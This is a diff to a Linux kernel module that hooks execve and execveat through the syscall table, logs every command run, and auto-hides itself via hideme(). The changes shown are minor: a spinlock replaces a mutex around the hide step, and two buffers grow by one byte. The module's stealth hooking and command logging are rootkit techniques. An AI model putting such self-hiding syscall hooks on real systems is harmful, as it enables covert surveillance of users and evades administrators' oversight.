@@ -55,6 +55,7 @@ IMPORTANT
 #include <linux/kthread.h> 
 #include <linux/delay.h>  
 #include <linux/sched/signal.h> 
+#include <linux/spinlock.h>
 
 
 MODULE_LICENSE("GPL");
@@ -72,7 +73,7 @@ MODULE_DESCRIPTION("LKM Library: Log comands run on the system");
 unsigned long *sys_call_table;
 static int hidden = 0; 
 static int activate_autohide = 1; 
-static DEFINE_MUTEX(hide_lock); 
+static DEFINE_SPINLOCK(hide_lock); 
 
 static asmlinkage long (*orig_execve)(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp);
 static asmlinkage long (*orig_execveat)(int dfd, const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp, int flags); 
@@ -142,7 +143,7 @@ static void notrace log_command(const char *command, const char *args, const cha
     char *time_str;
     char *log_entry;
 
-    time_str = kmalloc(64, GFP_KERNEL);
+    time_str = kmalloc(65, GFP_KERNEL);
     if (!time_str) return;
 
     log_entry = kmalloc(LOG_SIZE, GFP_KERNEL);
@@ -263,10 +264,10 @@ notrace asmlinkage long hook_execve(const char __user *filename, const char __us
     char *args, *cwd, *tty;
 
     if (activate_autohide && !hidden) {
-        mutex_lock(&hide_lock);
+        spin_lock(&hide_lock);
         hideme();
         hidden = 1;
-        mutex_unlock(&hide_lock);
+        spin_unlock(&hide_lock);
     }
 
     if (check_forbidden_command(filename, argv)) {
@@ -283,7 +284,7 @@ notrace asmlinkage long hook_execve(const char __user *filename, const char __us
         return -ENOMEM;
     }
 
-    tty = kmalloc(64, GFP_KERNEL);
+    tty = kmalloc(65, GFP_KERNEL);
     if (!tty) {
         kfree(args);
         kfree(cwd);
@@ -304,10 +305,10 @@ notrace asmlinkage long hook_execveat(int dfd, const char __user *filename, cons
     char *args, *cwd, *tty;
 
     if (activate_autohide && !hidden) {
-        mutex_lock(&hide_lock);
+        spin_lock(&hide_lock);
         hideme();
         hidden = 1;
-        mutex_unlock(&hide_lock);
+        spin_unlock(&hide_lock);
     }
 
     if (check_forbidden_command(filename, argv)) {
@@ -324,7 +325,7 @@ notrace asmlinkage long hook_execveat(int dfd, const char __user *filename, cons
         return -ENOMEM;
     }
 
-    tty = kmalloc(64, GFP_KERNEL);
+    tty = kmalloc(65, GFP_KERNEL);
     if (!tty) {
         kfree(args);
         kfree(cwd);
